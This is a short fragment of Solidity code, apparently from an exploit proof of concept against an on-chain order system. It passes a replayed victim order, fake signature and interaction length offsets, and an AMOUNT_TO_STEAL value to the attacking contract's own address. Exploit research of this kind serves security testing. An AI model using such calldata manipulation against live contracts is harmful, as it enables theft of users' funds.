                _buildVictimReplayOrder(),
                uint256(FAKE_SIGNATURE_LENGTH_OFFSET),
                uint256(FAKE_INTERACTION_LENGTH_OFFSET),
                uint256(0),
                uint256(AMOUNT_TO_STEAL),
                uint256(0),
                address(this)
